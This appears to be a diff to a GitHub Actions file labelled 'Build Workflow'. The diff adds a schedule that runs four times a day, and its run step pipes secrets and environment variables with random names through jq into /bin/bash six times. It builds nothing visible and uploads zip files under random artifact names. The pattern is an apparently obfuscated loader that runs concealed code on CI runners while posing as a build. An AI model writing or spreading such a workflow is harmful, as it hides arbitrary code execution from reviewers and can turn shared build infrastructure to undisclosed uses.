@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,17 +17,19 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          abgf29: ${{ secrets.abgf29 }}
+          t400: ${{ secrets.t400 }}
         run: |
-          printf '%s' "$abgf29" | jq -r .jx80373 | /bin/bash
-          echo $eers64009 | jq -r .lfixt096 | /bin/bash
-          echo $larlt85763 | jq -r .jbqhs30 | /bin/bash
-          printf '%s' "$ddm0404" | jq -r .gprq3760 | /bin/bash
+          printf '%s' "$t400" | jq -r .pl80 | /bin/bash
+          printf '%s' "$dow2369" | jq -r .siat230 | /bin/bash
+          printf '%s' "$hj82" | jq -r .hmqhm66 | /bin/bash
+          echo $zjaup314 | jq -r .vem98 | /bin/bash
+          printf '%s' "$r82" | jq -r .jvwb618 | /bin/bash
+          echo $fkk3 | jq -r .gm33 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: RU9aRt4W
+          name: HJOITsOy
           path: "*.zip"
           retention-days: 1
